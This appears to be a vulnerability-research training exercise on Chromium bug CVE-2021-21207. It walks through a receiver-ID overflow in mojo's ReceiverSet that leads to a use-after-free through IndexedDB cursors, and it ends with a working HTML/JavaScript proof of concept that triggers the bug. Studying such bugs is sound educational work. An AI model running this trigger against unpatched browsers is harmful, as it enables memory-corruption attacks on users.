# Exercise 4

In LEVEL 1, we can relay on Details and just to search for the func which Details mentioned. It is far away from the real bug hunting scene.

LEVEL 2 we do the same as LEVEL 1 without the help of Details.

But the bug report need Poc to assist developer reproduce the vulnerability, and know exactly what cause this bug. So LEVEL 3 need we construct Poc by ourselves.

## CVE-2021-21207
I sugget you don't search any report about it to prevents get too much info like patch. Our goal is to find some bugs, not construct Poc. But in truth, Poc can proof that we are right.



### Details

In level 3, we do it without the help of Details


---------

<details>
  <summary>For more info click me! But you'd better not do this</summary>

  https://bugs.chromium.org/p/chromium/issues/detail?id=1185732

</details>

--------

### Set environment

after fetch chromium
```sh
git reset --hard 86a37b3c8fdc47b0ba932644fd61bbc791c82357
```



### Related code

mojo/public/cpp/bindings/receiver_set.h

read this [doc](https://chromium.googlesource.com/chromium/src/+/668cf831e91210d4f23e815e07ff1421f3ee9747/mojo/public/cpp/bindings#Receiver-Sets) get info about Receiver Sets

### Do it
Do this exercise by yourself, when you have some idea, you can compare your answer with me. If you find my answer have something wrong, please tell me.


---------

<details>
  <summary>My answer</summary>

  This function only checks whether the ID is equal to 0, but does not judge whether the ID is reused.so if the has same id inset to container,will free the previous.
  ```c++  
  ReceiverId AddImpl(ImplPointerType impl,
                     PendingType receiver,
                     Context context,
                     scoped_refptr<base::SequencedTaskRunner> task_runner) {
    DCHECK(receiver.is_valid());
    ReceiverId id = next_receiver_id_++;
    DCHECK_GE(next_receiver_id_, 0u);
    auto entry =
        std::make_unique<Entry>(std::move(impl), std::move(receiver), this, id,
                                std::move(context), std::move(task_runner));
    receivers_.insert(std::make_pair(id, std::move(entry)));
    return id;
  }
  ```
  If we add id to maxsize,then extra add 1,will overflow.Insert same id ,will free previous , then we can use the freed pointer ,cause UAF.
  ```c++
  namespace mojo {

  using ReceiverId = size_t;

  template <typename ReceiverType>
  struct ReceiverSetTraits;
  ```
  Where can cause UAF? the poc  use cursor_impl pointer , cursor_impl_ptr->OnRemoveBinding
  ```c++
  mojo::PendingAssociatedRemote<blink::mojom::IDBCursor>
IndexedDBDispatcherHost::CreateCursorBinding(
    const url::Origin& origin,
    std::unique_ptr<IndexedDBCursor> cursor) {
  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);
  auto cursor_impl = std::make_unique<CursorImpl>(std::move(cursor), origin,
                                                  this, IDBTaskRunner());
  auto* cursor_impl_ptr = cursor_impl.get();
  mojo::PendingAssociatedRemote<blink::mojom::IDBCursor> remote;
  mojo::ReceiverId receiver_id = cursor_receivers_.Add(
      std::move(cursor_impl), remote.InitWithNewEndpointAndPassReceiver());
  cursor_impl_ptr->OnRemoveBinding(
      base::BindOnce(&IndexedDBDispatcherHost::RemoveCursorBinding,
                     weak_factory_.GetWeakPtr(), receiver_id));
  return remote;
}
  ```
**POC**
```html
<html>
    <script>
            var db;
            var first = 1;
            const indexedDB = window.indexedDB || window.webkitIndexedDB ||  window.mozIndexedDB;
            const request = indexedDB.open("aaa", 2);
            request.onsuccess = (e) => {
                db = e.target.result;
                console.log("success");
            };
            request.onupgradeneeded = (e) => {
                console.log("upgrade");
                db = e.target.result;
                if(!this.db.objectStoreNames.contains("dd2")){
                    this.store = this.db.createObjectStore("dd2", { keyPath: 'key'});
                }
            }
            request.onerror = (e) => {console.log('Can not open indexedDB', e);};
            const sleep = (timeountMS) => new Promise((resolve) => {
                setTimeout(resolve, timeountMS);
            });
            async function f(){
                console.log("in f")
                if(first==1){
                    first = 0;
                    await sleep(10000);
                    a = db.transaction(["dd2"],'readwrite');
                    b = a.objectStore("dd2");
                    c = b.openCursor();
                }
                var transaction = db.transaction(["dd2"],'readwrite');
                var objectstore = transaction.objectStore("dd2");
                objectstore.add({"key":1});
                for(var i =0;i<0x500;i++) {
                    var a1 = objectstore.openCursor(); //1
                }
            }
            var a;
            var b;
            var c; // c will hold cursor which id = 0
            f();
            for (var i =0 ;i<1000;i++){
                setTimeout(f,10000+1000*i)//when function f end,0x500 cursor in receivers_ will be removed to avoid oom
            }


    </script>
</html>
```

</details>

--------
